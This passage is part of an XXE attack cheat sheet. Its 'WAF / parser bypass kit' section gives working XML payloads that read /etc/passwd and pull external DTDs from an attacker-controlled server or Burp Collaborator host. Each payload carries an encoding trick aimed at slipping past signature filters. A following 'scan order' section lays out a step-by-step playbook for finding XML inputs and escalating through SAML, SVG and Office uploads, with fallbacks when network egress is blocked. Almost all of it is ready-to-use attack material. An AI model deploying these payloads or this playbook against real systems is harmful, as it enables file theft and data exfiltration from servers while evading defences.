# ---------------- 20. WAF / PARSER BYPASS KIT ----------------
# no-space compact (WAF tests whitespace):
<!DOCTYPE data[<!ENTITY xxe SYSTEM"file:///etc/passwd">]>
<!DOCTYPE data[<!ENTITY%xxe SYSTEM"http://BURP-COLLABORATOR-SUBDOMAIN">%xxe;]>
# %-encoded parameter entity name (defeats "ENTITY %" signature scans):
<!DOCTYPE data [ <!ENTITY &#37; xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
# UTF-16 whole-payload (some WAFs only match ASCII):
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
# UTF-16 BOM + encoding (strip BOM first if the app injects it):
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# CRLF inside the SYSTEM URI (dodges URI regex):
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0d%0a"> ]>
# CDATA wrap to pass through markup filters:
<![CDATA[<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>]]>
# DOCTYPE inside the root (some parsers accept late DOCTYPE):
<root><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</root>
# html-entity-encoded (double-decoding mazes):
&lt;!DOCTYPE data [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
# parameter entity inside external DTD on a 2nd host (sandbox bypass):
<!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/payload2.dtd"> %dtd; ]>

# ---------------- 21. SCAN ORDER (2026-2030) ----------------
# 1. Find XML input (SOAP/SAML/OOXML/SVG/XSLT/params) -> cookie/body/upload.
# 2. DTD alive?  -> classic in-band file read OR blind OOB (section 3).
# 3. DOCTYPE denied? -> XInclude (sec 7) -> XSLT document() (sec 15) -> xsd:include (sec 16).
# 4. External DTD denied, entities on? -> error-based internal (sec 5/6).
# 5. All parser-hardened? -> hit the OTHER xml consumers:
#      Office uploads (sec 14), SVG endpoints (sec 13), SAML (sec 17),
#      ImageMagick MSL, PDF X-Object, RSS/ATOM feeds, XML/JSON converters (sec 18).
# 6. Egress blocked on http? -> ftp/gopher/https/dict, DNS-canary via dtd (sec 10).
